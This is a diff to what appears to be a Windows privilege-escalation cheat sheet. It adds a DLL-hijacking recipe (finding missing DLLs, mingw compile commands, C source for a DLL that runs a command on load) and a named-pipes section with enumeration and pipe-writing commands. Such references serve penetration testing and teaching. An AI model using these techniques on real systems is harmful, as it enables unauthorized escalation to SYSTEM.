@@ -20,6 +20,7 @@
 * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
 * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
 * [EoP - Unquoted Service Paths](#eop---unquoted-service-paths)
+* [EoP - Named Pipes](#eop---named-pipes)
 * [EoP - Kernel Exploitation](#eop---kernel-exploitation)
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
@@ -470,6 +471,26 @@ dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 Often, services are pointing to writeable locations:
 - Orphaned installs, not installed anymore but still exist in startup
 - DLL Hijacking
+    ```powershell
+    # find missing DLL 
+    - Find-PathDLLHijack PowerUp.ps1
+    - Process Monitor : check for "Name Not Found"
+
+    # compile a malicious dll
+    - For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+    - For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+
+    # content of windows_dll.c
+    #include <windows.h>
+    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+        if (dwReason == DLL_PROCESS_ATTACH) {
+            system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
+            ExitProcess(0);
+        }
+        return TRUE;
+    }
+    ```
+
 - PATH directories with weak permissions
 
 ```powershell
@@ -604,6 +625,13 @@ Metasploit provides the exploit : `exploit/windows/local/trusted_service_path`
 For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
 - `C:\Program.exe`
 - `C:\Program Files.exe`
+
+## EoP - Named Pipes
+
+1. Find named pipes: `[System.IO.Directory]::GetFiles("\\.\pipe\")`
+2. Check named pipes DACL: `pipesec.exe <named_pipe>`
+3. Reverse engineering software
+4. Send data throught the named pipe : `program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`
 
 
 ## EoP - Kernel Exploitation
@@ -950,3 +978,4 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
 * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
 * [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
+* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
